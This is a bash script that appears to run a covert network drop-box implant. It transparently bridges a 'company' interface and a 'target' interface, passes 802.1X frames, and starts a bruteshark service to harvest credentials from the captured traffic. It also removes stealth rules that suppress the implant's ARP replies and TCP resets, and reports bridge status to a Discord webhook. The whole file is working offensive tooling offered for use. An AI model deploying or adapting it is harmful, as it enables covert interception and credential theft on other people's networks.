#!/bin/bash

set -euo pipefail
source /opt/implant/config.env

# === Logging setup ===
log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $*"
}
exec >> "$BRIDGE_SYNC_LOG" 2>&1

# === Helper functions ===

send_discord_notification() {
    local message="$1"
    if [ "$DISCORD_NOTIFY" = true ] && [ -n "$BRIDGE_SYNC_DISCORD_WEBHOOK_URL" ]; then
        curl -s -X POST -H "Content-Type: application/json" \
            -d "{\"content\": \"$message\"}" \
            "$BRIDGE_SYNC_DISCORD_WEBHOOK_URL" > /dev/null
    fi
}

interface_exists() {
    ip link show "$1" &>/dev/null
}

is_up() {
    ip link show "$1" | grep -q "state UP"
}

has_carrier() {
    if interface_exists "$1"; then
        if ! is_up "$1"; then
            ip link set "$1" up
            sleep 1
        fi
        if ethtool "$1" 2>/dev/null | grep -q "Link detected: yes"; then
            log "Interface $1 is UP and has carrier."
            return 0
        else
            log "Interface $1 is UP but has NO carrier."
            return 1
        fi
    else
        log "Interface $1 does not exist."
        return 1
    fi
}

bridge_exists() {
    ip link show "$BRIDGE" &>/dev/null
}

delete_bridge() {
    if bridge_exists; then
        log "Deleting bridge $BRIDGE"
        ip link set "$BRIDGE" down
        ip link delete "$BRIDGE" type bridge
        send_discord_notification "[${IMPLANT_WG_IP}] 🔴 Bridge \`$BRIDGE\` has been removed."
    else
        log "No bridge $BRIDGE to delete."
    fi

    if interface_exists "$VETH_IN"; then
        log "Deleting interface $VETH_IN"
        ip link delete "$VETH_IN" type veth
    fi

    if interface_exists "$VETH_OUT"; then
        log "Deleting interface $VETH_OUT (should be gone with veth pair)"
        ip link delete "$VETH_OUT" type veth
    fi

    for route in $(ip route show | grep "$VETH_OUT" | awk '{print $1}'); do
        log "Deleting route $route"
        ip route delete "$route"
    done

    if sudo ebtables -L FORWARD | grep -qE "^-i $VETH_IN -o $IFACE_TARGET -j DROP"; then
        log "Removing ebtables rule blocking $VETH_IN -> $IFACE_TARGET"
        ebtables -D FORWARD -i "$VETH_IN" -o "$IFACE_TARGET" -j DROP
    fi

    if sudo arptables -L OUTPUT | grep -qE "\-j DROP.*-o $BRIDGE.*--opcode Reply"; then
        log "Removing arptables blocking rule on $BRIDGE"
        sudo arptables -D OUTPUT -o "$BRIDGE" --opcode 2 -j DROP
    fi

    if sudo iptables -C OUTPUT -o "$VETH_OUT" -p tcp --tcp-flags RST RST -j DROP 2>/dev/null; then
        log "Removing iptables rule blocking TCP RST on $VETH_OUT"
        sudo iptables -D OUTPUT -o "$VETH_OUT" -p tcp --tcp-flags RST RST -j DROP
    fi

    log "Stopping bruteshark.service"
    systemctl stop bruteshark.service || log "Failed to stop bruteshark.service"
}

create_bridge() {
    log "Creating bridge $BRIDGE with $IFACE_COMPANY and $IFACE_TARGET"
    ip addr flush dev "$IFACE_COMPANY"
    ip addr flush dev "$IFACE_TARGET"
    ip link add "$BRIDGE" type bridge
    ip link set "$BRIDGE" type bridge stp_state 0
    ip link set "$IFACE_COMPANY" up
    ip link set "$IFACE_TARGET" up
    ip link set "$IFACE_COMPANY" master "$BRIDGE"
    ip link set "$IFACE_TARGET" master "$BRIDGE"
    ip link set "$BRIDGE" up
    echo 8 | tee "/sys/class/net/$BRIDGE/bridge/group_fwd_mask" > /dev/null

    log "Starting bruteshark.service"
    systemctl start bruteshark.service || log "Failed to start bruteshark.service"
    send_discord_notification "[${IMPLANT_WG_IP}] 🟢 Bridge \`$BRIDGE\` has been created."
}

# === Main logic ===

if interface_exists "$IFACE_COMPANY" && interface_exists "$IFACE_TARGET"; then
    log "Both $IFACE_COMPANY and $IFACE_TARGET exist."

    if has_carrier "$IFACE_COMPANY" && has_carrier "$IFACE_TARGET"; then
        if bridge_exists; then
            log "Bridge $BRIDGE already exists. No action needed."
        else
            create_bridge
        fi
    else
        log "One or both interfaces have no link."
        delete_bridge
    fi
else
    log "One or both interfaces do not exist."
    delete_bridge
fi
